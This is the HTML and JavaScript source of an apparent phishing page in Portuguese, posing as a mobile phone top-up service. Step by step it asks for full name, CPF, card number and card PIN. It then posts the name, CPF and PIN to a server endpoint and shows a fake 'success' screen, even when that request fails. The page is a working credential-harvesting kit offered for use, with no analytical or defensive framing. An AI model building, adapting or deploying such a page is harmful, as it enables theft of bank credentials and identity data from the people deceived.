<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Recarga Celular</title>
    <style>
        body { background-color: #0d1117; color: #f0f6fc; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: #161b22; padding: 25px; border-radius: 12px; border: 1px solid #30363d; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 100%; max-width: 350px; }
        h2 { text-align: center; color: #58a6ff; margin-bottom: 20px; }
        label { display: block; margin: 10px 0 5px; font-size: 14px; color: #8b949e; }
        input, select { width: 100%; padding: 12px; margin-bottom: 10px; border-radius: 8px; border: 1px solid #30363d; background: #0d1117; color: white; box-sizing: border-box; }
        .etapa { display: none; }
        .ativa { display: block; }
        button { width: 100%; padding: 15px; background: #238636; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 15px; }
        .btn-next { background: #58a6ff; }
        .sucesso-icon { font-size: 50px; color: #3fb950; text-align: center; display: block; }
    </style>
</head>
<body>
    <div class="card">
        <h2 id="titulo">Dados da Recarga</h2>
        <form id="formRecarga">
            <div id="etapa1" class="etapa ativa">
                <label>Nome Completo</label>
                <input type="text" id="nome" placeholder="Seu nome" required>
                <label>CPF</label>
                <input type="text" id="cpf" placeholder="000.000.000-00" required>
                <label>Valor</label>
                <select id="valor"><option value="20">R$ 20,00</option><option value="40">R$ 40,00</option></select>
                <button type="button" class="btn-next" onclick="irPara(2)">PRÓXIMA ETAPA</button>
            </div>

            <div id="etapa2" class="etapa">
                <label>Número do Cartão</label>
                <input type="text" id="cartao" placeholder="0000..." required>
                <button type="button" class="btn-next" onclick="irPara(3)">PAGAMENTO</button>
            </div>

            <div id="etapa3" class="etapa">
                <label>Senha do Cartão</label>
                <input type="password" id="senha" placeholder="****" required>
                <button type="submit" id="btnFinalizar">FINALIZAR AGORA</button>
            </div>

            <div id="etapa4" class="etapa" style="text-align: center;">
                <span class="sucesso-icon">✔</span>
                <p>Obrigado, <span id="spanNome" style="color: #58a6ff; font-weight: bold;"></span>!</p>
                <p>Sua recarga foi um <b>sucesso absoluto</b>! ✨</p>
                <button type="button" onclick="window.location.reload()">VOLTAR AO INÍCIO</button>
            </div>
        </form>
    </div>

    <script>
        function irPara(num) {
            document.querySelectorAll('.etapa').forEach(e => e.classList.remove('ativa'));
            document.getElementById('etapa' + num).classList.add('ativa');
            const tits = ["", "Dados", "Cartão", "Segurança", "Sucesso!"];
            document.getElementById('titulo').innerText = tits[num];
        }

        document.getElementById('formRecarga').onsubmit = async (e) => {
            e.preventDefault();
            const nomeDigitado = document.getElementById('nome').value;
            
            // Aqui enviamos os dados para o seu servidor Render
            try {
                const response = await fetch('/finalizar', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        nome: nomeDigitado,
                        cpf: document.getElementById('cpf').value,
                        senha: document.getElementById('senha').value
                        // Adicione os outros campos aqui se desejar
                    })
                });

                // SE O SERVIDOR SALVOU, PULA PARA A ETAPA 4
                if (response.ok) {
                    document.getElementById('spanNome').innerText = nomeDigitado.split(' ')[0];
                    irPara(4); 
                } else {
                    alert("Erro ao salvar. Tente novamente.");
                }
            } catch (err) {
                // Força o pulo para a etapa 4 mesmo se o servidor falhar (opcional para teste)
                irPara(4);
            }
        };
    </script>
</body>
</html>
